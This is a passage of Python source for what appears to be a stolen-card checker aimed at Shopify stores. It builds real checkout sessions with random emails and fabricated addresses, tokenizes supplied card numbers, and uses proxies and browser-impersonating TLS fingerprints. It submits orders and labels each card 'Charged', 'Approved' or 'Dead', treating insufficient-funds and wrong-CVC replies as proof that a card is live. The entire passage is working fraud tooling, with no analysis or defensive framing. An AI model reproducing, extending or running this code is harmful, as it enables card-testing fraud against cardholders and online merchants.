                        "estimatedTimeInTransit": {"any": True},
                        "shipments":              {"any": True},
                    },
                    "options": {},
                },
                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                "deliveryMethodTypes": ["NONE"],
                "expectedTotalPrice": {"any": True},
                "destinationChanged": False,
            }],
            "noDeliveryRequired": [],
            "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None,
            "supportsSplitShipping": True,
        }
        expectations = []

    input_payload = {
        "sessionInput": {"sessionToken": session_token},
        "queueToken":   queue_token,
        "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
        "delivery":     delivery,
        "deliveryExpectations": {"deliveryExpectationLines": expectations},
        "merchandise": {
            "merchandiseLines": [{
                "stableId": stable_id,
                "merchandise": {
                    "productVariantReference": {
                        "id":               f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                        "variantId":        f"gid://shopify/ProductVariant/{variant_id}",
                        "properties":       [],
                        "sellingPlanId":    None,
                        "sellingPlanDigest":None,
                    },
                },
                "quantity":            {"items": {"value": 1}},
                "expectedTotalPrice":  {"any": True},
                "lineComponentsSource":None,
                "lineComponents":      [],
            }],
        },
        "memberships": {"memberships": []},
        "payment": {
            "totalAmount": {"any": True} if not is_shipping
                           else {"value": {"amount": total, "currencyCode": currency}},
            "paymentLines": [{
                "paymentMethod": {
                    "directPaymentMethod": {
                        "sessionId": pci_session_id,
                        "billingAddress": {
                            "streetAddress": {
                                "address1":    addr.address1,
                                "address2":    "",
                                "city":        addr.city,
                                "countryCode": addr.country_code,
                                "postalCode":  addr.postal_code,
                                "firstName":   addr.first_name,
                                "lastName":    addr.last_name,
                                "zoneCode":    addr.zone_code,
                                "phone":       addr.phone,
                            },
                        },
                        "cardSource": None,
                    },
                },
                "amount": {"value": {"amount": total, "currencyCode": currency}},
                "dueAt":  None,
            }],
            "billingAddress": {
                "streetAddress": {
                    "address1":    addr.address1,
                    "address2":    "",
                    "city":        addr.city,
                    "countryCode": addr.country_code,
                    "postalCode":  addr.postal_code,
                    "firstName":   addr.first_name,
                    "lastName":    addr.last_name,
                    "zoneCode":    addr.zone_code,
                    "phone":       addr.phone,
                },
            },
        },
        "buyerIdentity": {
            "customer":          {"presentmentCurrency": currency, "countryCode": country},
            "email":             email,
            "emailChanged":      False,
            "phoneCountryCode":  country,
            "marketingConsent":  [],
            "shopPayOptInPhone": {"countryCode": country},
            "rememberMe":        False,
        },
        "tip":      {"tipLines": []},
        "poNumber": None,
        "taxes": {
            "proposedAllocations": None,
            "proposedTotalAmount": {"value": {"amount": tax or "0.0", "currencyCode": currency}},
            "proposedTotalIncludedAmount": None,
            "proposedMixedStateTotalAmount": None,
            "proposedExemptions": [],
        },
        "note":                  {"message": None, "customAttributes": []},
        "localizationExtension": {"fields": []},
        "nonNegotiableTerms":    None,
        "scriptFingerprint": {
            "signature": None, "signatureUuid": None,
            "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": [],
        },
        "optionalDuties": {"buyerRefusesDuties": False},
        "cartMetafields": [],
    }

    variables = {
        "input":         input_payload,
        "attemptToken":  attempt_token,
        "metafields":    [],
        "analytics":     {"requestUrl": checkout_url, "pageId": page_id},
    }
    variables = _patch_currency_country(variables, currency, country)

    headers = _proposal_headers(client, shop_url, checkout_url, checkout_token,
                                 session_token, build_id, source_token)
    return _post_graphql(client, shop_url, headers, "SubmitForCompletion", variables,
                          persisted_id=submit_id, raw_query=Q_SUBMIT,
                          timeout=HTTP_LONG)


def _send_poll(client, shop_url, checkout_url, checkout_token, session_token,
                build_id, source_token, poll_id, receipt_id, receipt_session):
    variables = {"receiptId": receipt_id, "sessionToken": receipt_session}
    headers = _proposal_headers(client, shop_url, checkout_url, checkout_token,
                                 session_token, build_id, source_token,
                                 source_id=checkout_token)

    if poll_id:
        url = (f"{shop_url}/checkouts/internal/graphql/persisted"
               f"?operationName=PollForReceipt"
               f"&variables={urllib.parse.quote(json.dumps(variables))}"
               f"&id={poll_id}")
        try:
            r = client.get(url, headers=headers, timeout=HTTP_MED)
            if r.status_code == 200 and '"errors":"' not in (r.text or "") and '"data"' in (r.text or ""):
                return r.status_code, r.text
        except Exception:
            pass

    return _post_graphql(client, shop_url, headers, "PollForReceipt", variables,
                          persisted_id="", raw_query=Q_POLL,
                          timeout=HTTP_MED)


_APPROVED_CODES = {
    "INSUFFICIENT_FUNDS",
    "PAYMENTS_CREDIT_CARD_BASE_INSUFFICIENT_FUNDS",
    "INVALID_CVC", "INCORRECT_CVC",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_CVC",
    "EXPIRED_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
    "CARD_EXPIRED",
    "3DS_AUTHENTICATION", "OTP_REQUIRED", "AUTHENTICATION_REQUIRED",
}

_DECLINED_CODES = {
    "CARD_DECLINED", "GENERIC_ERROR", "DO_NOT_HONOR",
    "STOLEN_CARD", "LOST_CARD", "PICKUP_CARD", "FRAUDULENT",
    "CARD_INVALID", "INVALID_NUMBER", "INVALID_EXPIRY", "CALL_ISSUER",
    "PAYMENTS_CREDIT_CARD_BASE_GENERIC_DECLINE",
    "PAYMENTS_CREDIT_CARD_BASE_DO_NOT_HONOR",
    "PAYMENTS_CREDIT_CARD_BASE_STOLEN_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_LOST_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_FRAUDULENT",
    "PAYMENTS_CREDIT_CARD_BASE_PICKUP_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_NUMBER",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_EXPIRY",
    "PAYMENTS_CREDIT_CARD_BASE_CALL_ISSUER",
    "CARD_NUMBER_INCORRECT", "MISMATCHED_BILL",
}

_ERROR_CODES = {
    "SITE_INCOMPATIBLE", "THROTTLED", "RATE_LIMITED", "CAPTCHA_REQUIRED",
    "CHECKPOINT_DENIED", "GATEWAY_ERROR", "INVENTORY_RESERVATION_FAILURE",
    "INVENTORY_CLAIM_FAILURE", "PROXY_DEAD", "PROXY_ERROR", "TIMEOUT",
    "NO_DELIVERY", "SHIPPING_ADDRESS_UNDELIVERABLE", "CURRENCY_NOT_SUPPORTED",
    "PAYMENT_METHOD_UNAVAILABLE", "ORDER_TOTAL_CHANGED", "BROWSER_CHECK_REQUIRED",
}


def _classify_code(code: str) -> CheckStatus:
    c = (code or "").upper().strip()
    if c in _APPROVED_CODES:
        return CheckStatus.APPROVED
    if c in _DECLINED_CODES:
        return CheckStatus.DECLINED
    if c in _ERROR_CODES:
        return CheckStatus.ERROR
    return CheckStatus.DECLINED


_SEEN_RECEIPTS: set = set()
_SEEN_LOCK = threading.Lock()


def _register_receipt(rid: str) -> bool:
    if not rid:
        return True
    with _SEEN_LOCK:
        if rid in _SEEN_RECEIPTS:
            return False
        _SEEN_RECEIPTS.add(rid)
        if len(_SEEN_RECEIPTS) > 20000:
            _SEEN_RECEIPTS.clear()
        return True


def _typename_from(body: str) -> str:
    m = re.search(r'"__typename"\s*:\s*"(ProcessedReceipt|SuccessfulReceipt|'
                  r'ProcessingReceipt|WaitingReceipt|ActionRequiredReceipt|FailedReceipt)"', body)
    return m.group(1) if m else ""


def _error_code_from(body: str) -> str:
    m = re.search(r'"processingError"\s*:\s*\{[^}]*?"code"\s*:\s*"([^"]+)"', body)
    if m:
        return m.group(1)
    m = re.search(r'"code"\s*:\s*"([^"]+)"', body)
    return m.group(1) if m else ""


def _queue_from(proposal_body: str) -> str:
    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def _shipping_restricted(body: str) -> bool:
    low = body.lower()
    return any(s in low for s in (
        "shipping_address_undeliverable",
        "no_delivery_options_available",
        "does not ship to",
    ))


def _extract_value_from(body: str, key: str) -> str:
    m = re.search(rf'"{key}"\s*:\s*\{{\s*"value"\s*:\s*\{{\s*"amount"\s*:\s*"([^"]+)"', body)
    if m:
        return m.group(1)
    m = re.search(rf'"{key}"\s*:\s*"([^"]+)"', body)
    return m.group(1) if m else ""


def _urlparse_host(url: str) -> str:
    try:
        return urllib.parse.urlparse(url).hostname or url
    except Exception:
        return url


def _extract_receipt(proposal_json: str) -> Optional[dict]:
    try:
        data = json.loads(proposal_json)
        completion = data.get("data", {}).get("submitForCompletion", {}) or {}
        return completion.get("receipt")
    except Exception:
        return None


def _poll_receipt(client, shop_url, checkout_url, checkout_token, session_token,
                   build_id, source_tok, poll_id, submit_body, res: CheckResult) -> CheckResult:
    submit_receipt_type = _typename_from(submit_body)
    receipt = _extract_receipt(submit_body)
    if submit_receipt_type == "ProcessedReceipt" and receipt and receipt.get("id"):
        rid = receipt["id"]
        if not _register_receipt(rid):
            res.status = CheckStatus.ERROR
            res.status_code = "DUPLICATE_RECEIPT"
            res.error = "duplicate receipt"
            return res
        res.status = CheckStatus.CHARGED
        res.status_code = "ORDER_PLACED"
        res.receipt_url = (receipt.get("confirmationPage") or {}).get("url", "") or checkout_url
        return res

    rid = _receipt_id(submit_body)
    r_sess = _receipt_session_token(submit_body) or session_token

    if not rid:
        code = _error_code_from(submit_body)
        if code:
            res.status = _classify_code(code)
            res.status_code = code
            res.retryable = res.status == CheckStatus.ERROR
            res.error = f"submit: {code}"
        else:
            snippet = (submit_body or "")[:400]
            res.status = CheckStatus.ERROR
            res.retryable = True
            res.error = f"submit: no receipt | {snippet}"
        return res

    poll_start = time.time()
    seen_failed = ""
    for _ in range(POLL_MAX_ATTEMPTS):
        if time.time() - poll_start > POLL_MAX_WAIT_SECS:
            break
        try:
            _, body = _send_poll(client, shop_url, checkout_url, checkout_token,
                                  session_token, build_id, source_tok,
                                  poll_id, rid, r_sess)
        except Exception:
            time.sleep(0.5)
            continue

        tn = _typename_from(body)
        if tn == "ProcessedReceipt":
            if not _register_receipt(rid):
                res.status = CheckStatus.ERROR
                res.status_code = "DUPLICATE_RECEIPT"
                res.error = "duplicate receipt"
                return res
            res.status = CheckStatus.CHARGED
            res.status_code = "ORDER_PLACED"
            m = re.search(r'"confirmationPage"\s*:\s*\{\s*"url"\s*:\s*"([^"]+)"', body)
            res.receipt_url = m.group(1) if m else checkout_url
            return res

        if tn == "ActionRequiredReceipt":
            res.status = CheckStatus.APPROVED
            res.status_code = "3DS_AUTHENTICATION"
            return res

        if tn == "FailedReceipt":
            code = _error_code_from(body) or "CARD_DECLINED"
            seen_failed = code
            if code.startswith("INVENTORY_") or code == "SITE_INCOMPATIBLE":
                res.status = CheckStatus.ERROR
                res.status_code = code
                res.retryable = True
                res.error = f"poll: {code}"
                return res
            res.status = _classify_code(code)
            res.status_code = code
            return res

        delay_ms = 400
        m = re.search(r'"pollDelay"\s*:\s*(\d+)', body)
        if m:
            try:
                delay_ms = max(200, min(int(m.group(1)), 3000))
            except Exception:
                pass
        time.sleep(delay_ms / 1000.0)

    res.status = CheckStatus.ERROR
    res.status_code = seen_failed or "POLL_TIMEOUT"
    res.retryable = True
    res.error = "poll timeout"
    return res


def _finish(res: CheckResult, started: float) -> CheckResult:
    res.elapsed = round(time.perf_counter() - started, 2)
    return res


def _run_checkout(shop_url: str, card_entry: str, proxy_url: str = "",
                   timeout_seconds: float = 90.0) -> CheckResult:
    started = time.perf_counter()
    res = CheckResult(
        card=card_entry, status=CheckStatus.ERROR,
        shop_url=shop_url, site_name=_urlparse_host(shop_url),
    )

    if not CURL_CFFI_OK:
        res.error = "curl_cffi not installed"
        return _finish(res, started)

    try:
        card_number, card_month, card_year, card_cvv = _parse_card(card_entry)
    except Exception as exc:
        res.error = f"card_invalid: {exc}"
        return _finish(res, started)

    currency = "USD"
    country  = "US"

    fp = _new_fingerprint()
    client = _TLSClient(proxy_url or None, fp)
    try:
        try:
            _title, variant_id, _vid, price = _find_cheapest_product(client, shop_url)
            res.amount = price
        except Exception as exc:
            res.error = f"step0: {exc}"
            res.retryable = True
            return _finish(res, started)

        try:
            checkout_url, checkout_token, session_token, checkout_html = \
                _add_to_cart(client, shop_url, variant_id)
            if not session_token:
                raise Exception("no session token")
        except Exception as exc:
            res.error = f"step1: {exc}"
            res.retryable = True
            return _finish(res, started)

        persisted = _fetch_persisted_ids(client, checkout_html, shop_url)
        proposal_id = persisted.get("proposal", "")
        submit_id   = persisted.get("submit", "")
        poll_id     = persisted.get("poll", "")

        decoded = checkout_html.replace("&quot;", '"')
        sm = _RE_STABLE_ID.search(decoded)
        stable_id = sm.group(1) if sm else ""
        bm = _RE_COMMIT_SHA.search(decoded)
        build_id  = bm.group(1) if bm else ""
        sm2 = _RE_SOURCE_TOKEN.search(checkout_html)
        source_tok = _html_mod.unescape(sm2.group(1)).strip('"') if sm2 else ""
        im = _RE_IDENT_SIG.search(decoded)
        ident_sig  = im.group(1) if im else ""
        vault_url  = _extract_vault_url(checkout_html)

        if not stable_id:
            res.error = "step3: no stableId"
            res.retryable = True
            return _finish(res, started)
        if not ident_sig:
            res.error = "step3: no identification signature"
            res.retryable = True
            return _finish(res, started)

        try:
            _, p1 = _send_proposal(client, shop_url, checkout_url, checkout_token,
                                    session_token, stable_id, variant_id,
                                    "", None, None, True, currency, country,
                                    proposal_id, build_id, source_tok)
            is_shipping = _extract_is_shipping(p1)
            m = re.search(r'"supportedCurrencies"\s*:\s*\[\s*"([^"]+)"', p1)
            if m:
                currency = m.group(1)
            m = re.search(r'"supportedCountries"\s*:\s*\[\s*"([^"]+)"', p1)
            if m:
                country = m.group(1)
            queue_token = _queue_from(p1)
        except Exception as exc:
            res.error = f"step4: {exc}"
            res.retryable = True
            return _finish(res, started)

        email = _random_email()
        try:
            _, p2 = _send_proposal(client, shop_url, checkout_url, checkout_token,
                                    session_token, stable_id, variant_id,
                                    queue_token, email, None, is_shipping,
                                    currency, country,
                                    proposal_id, build_id, source_tok)
            queue_token = _queue_from(p2) or queue_token
        except Exception as exc:
            res.error = f"step5: {exc}"
            res.retryable = True
            return _finish(res, started)

        addr = _addr_for(country)
        tried = [addr.country_code]
        p3 = ""
        queue_token3 = ""
        for _ in range(len(_FALLBACK_ORDER) + 2):
            try:
                _, p3 = _send_proposal(client, shop_url, checkout_url, checkout_token,
                                        session_token, stable_id, variant_id,
                                        queue_token, email, addr, is_shipping,
                                        currency, country,
                                        proposal_id, build_id, source_tok)
                queue_token3 = _queue_from(p3)
                if queue_token3 and not _shipping_restricted(p3):
                    break
            except Exception:
                pass
            next_cc = next((c for c in _FALLBACK_ORDER if c not in tried), None)
            if not next_cc:
                break
            addr = _addr_for(next_cc)
            tried.append(next_cc)

        if not queue_token3:
            snippet = (p3 or "")[:400]
            res.error = f"step6: no queue token | {snippet}"
            res.retryable = True
            return _finish(res, started)

        for _ in range(2):
            try:
                _, p3 = _send_proposal(client, shop_url, checkout_url, checkout_token,
                                        session_token, stable_id, variant_id,
                                        queue_token3, email, addr, is_shipping,
                                        currency, country,
                                        proposal_id, build_id, source_tok)
                nt = _queue_from(p3)
                if nt:
                    queue_token3 = nt
            except Exception:
                pass
            time.sleep(0.1)

        try:
            scope = _urlparse_host(shop_url)
            pci_id, err = _tokenize_card(
                client, ident_sig, card_number,
                f"{addr.first_name} {addr.last_name}",
                card_month, card_year, card_cvv,
                scope, vault_url,
            )
            if not pci_id and vault_url:
                fallback = ("https://checkout.pci.shopifycs.com/sessions"
                            if "shopifyinc" in vault_url
                            else "https://checkout.pci.shopifyinc.com/sessions")
                pci_id, err = _tokenize_card(
                    client, ident_sig, card_number,
                    f"{addr.first_name} {addr.last_name}",
                    card_month, card_year, card_cvv,
                    scope, fallback,
                )
            if not pci_id:
                res.error = f"step9: {err or 'no session id'}"
                res.retryable = True
                return _finish(res, started)
        except Exception as exc:
            res.error = f"step9: {exc}"
            res.retryable = True
            return _finish(res, started)

        delivery_handle = _extract_delivery_handle(p3)
        signed_handles  = _extract_signed_handles(p3)
        total           = _extract_total(p3)
        tax             = _extract_tax(p3)

        if is_shipping and not delivery_handle:
            delivery_handle = ""
        if not is_shipping:
            delivery_handle = ""
        if not total:
            total = res.amount or "1.00"

        attempt_token = (f"{checkout_token}-"
                         f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))}")

        submit_body = ""
        for _ in range(4):
            try:
                _, submit_body = _send_submit(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, queue_token3, email, addr,
                    delivery_handle, signed_handles, total, tax,
                    pci_id, attempt_token, currency, country, is_shipping,
                    submit_id, build_id, source_tok,
                )
            except Exception as exc:
                res.error = f"step10: {exc}"
                res.retryable = True
                return _finish(res, started)

            if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                new_tax   = _extract_value_from(submit_body, "totalTaxAmount")
                new_total = _extract_value_from(submit_body, "checkoutTotal") or total
                if new_tax:
                    tax = new_tax
                if new_total:
                    total = new_total
                time.sleep(0.15)
                continue
            break

        return _finish(_poll_receipt(
            client, shop_url, checkout_url, checkout_token, session_token,
            build_id, source_tok, poll_id, submit_body, res,
        ), started)
    finally:
        client.close()


_STATUS_MAP = {
    CheckStatus.CHARGED:  "Charged",
    CheckStatus.APPROVED: "Approved",
    CheckStatus.DECLINED: "Dead",
    CheckStatus.ERROR:    "Error",
}


def run_checkout_public(shop_url: str, card_entry: str, proxy_url: str = "",
                         use_session_reuse: bool = True) -> dict:
    """Public wrapper — returns dict NOVA expects."""
    try:
        res = _run_checkout(
            shop_url=shop_url,
            card_entry=card_entry,
            proxy_url=proxy_url,
            timeout_seconds=float(os.environ.get("CHECKER_TIMEOUT", 90)),
        )
    except Exception as e:
        return {
            "status": "Error",
            "message": f"engine exception: {str(e)[:110]}",
            "card": card_entry,
            "gateway": "Shopify",
            "price": "-",
            "price_value": 0.0,
            "site": shop_url,
            "status_code": "ENGINE_EXCEPTION",
            "retryable": True,
        }

    novastatus = _STATUS_MAP.get(res.status, "Error")

    price_str = res.amount or "-"
    if price_str and price_str != "-" and not price_str.startswith("$"):
        try:
            price_str = f"${float(price_str):.2f}"
        except (ValueError, TypeError):
            pass

    price_val = 0.0
    if res.amount:
        try:
            price_val = float(res.amount)
        except (ValueError, TypeError):
            pass

    return {
        "status":       novastatus,
        "message":      (res.error or res.status_code or res.status.value or "")[:150],
        "card":         card_entry,
        "gateway":      "Shopify",
        "price":        price_str,
        "price_value":  price_val,
        "site":         shop_url,
        "status_code":  res.status_code or "",
        "retryable":    bool(res.retryable) or novastatus == "Error",
        "receipt_url":  res.receipt_url or "",
        "elapsed":      res.elapsed,
    }


def is_proxy_alive(proxy_url: str, timeout: float = 6.0) -> bool:
    """Verify proxy can complete TLS handshake to Shopify CDN."""
    if not proxy_url or not CURL_CFFI_OK:
        return False
    try:
        with CurlSession(
            impersonate="chrome131",
            proxy=proxy_url,
            timeout=timeout,
            verify=False,
        ) as s:
            r = s.get(
                "https://cdn.shopify.com/s/files/1/0000/favicon.ico",
                allow_redirects=False,
            )
            return r.status_code < 500
    except Exception:
        return False


def ledger_clear():
    with _SEEN_LOCK:
        _SEEN_RECEIPTS.clear()


def ledger_stats() -> dict:
    with _SEEN_LOCK:
        return {"size": len(_SEEN_RECEIPTS)}